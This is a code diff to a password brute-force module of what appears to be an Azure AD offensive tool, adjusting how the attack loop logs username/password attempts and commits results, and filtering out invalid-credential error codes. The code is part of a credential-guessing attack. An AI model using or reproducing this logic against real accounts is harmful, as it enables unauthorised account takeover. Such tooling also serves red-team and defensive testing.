@@ -1,6 +1,5 @@
 
 
-from email import message
 import adal
 from sqlalchemy.sql.expression import false, true
 from vajra import db
@@ -31,9 +30,11 @@ class bruteforceAttack():
                     error_code = e.error_response['error_codes'][0]
                     error_description = e.error_response['error_description'].split(": ")[1]
                     message = error_description.split("\n")[0]
-                    errorLog = f"<span style=\"color:red\"><br><br>Username: {victim} <br>Password: {password} <br> Message: {message}<br></span>"
-                    db.session.add(bruteforceLogs(uuid=uuid, message=errorLog))
+                    #errorLog = f"<span style=\"color:red\"><br><br>Username: {victim} <br>Password: {password} <br> Message: {message}<br></span>"
+                    #db.session.add(bruteforceLogs(uuid=uuid, message=errorLog))
                     if error_code != 50126:
+                        errorLog = f"<span style=\"color:red\"><br><br>Username: {victim} <br>Password: {password} <br> Message: {message}<br></span>"
+                        db.session.add(bruteforceLogs(uuid=uuid, message=errorLog))
                         res = bruteforceResult(uuid=uuid, victim=victim, password=password, errorCode=error_code, message=message, endpoint=endpoint)
                         db.session.add(res)
 
@@ -66,12 +67,14 @@ class bruteforceAttack():
         for victim in usernames:
             victim = victim.usernames
             db.session.query(bruteforceResult).filter_by(uuid=uuid, victim=victim).delete()
+            
             for password in passwords:
                 password = password.passwords
                 message = f"<br><span style=\"color:yellow\">[!] {victim} : {password} </span>" 
                 db.session.add(bruteforceLogs(uuid=uuid, message=message))
+                db.session.commit()
                 res = bruteforceAttack.spray(uuid, password, endpoints, victim)
                 if res == true:
                     break
-            db.session.rollback()
+                
         db.engine.execute(text("UPDATE attack_status SET bruteforce ='False' WHERE uuid = :uuid"), uuid=uuid)
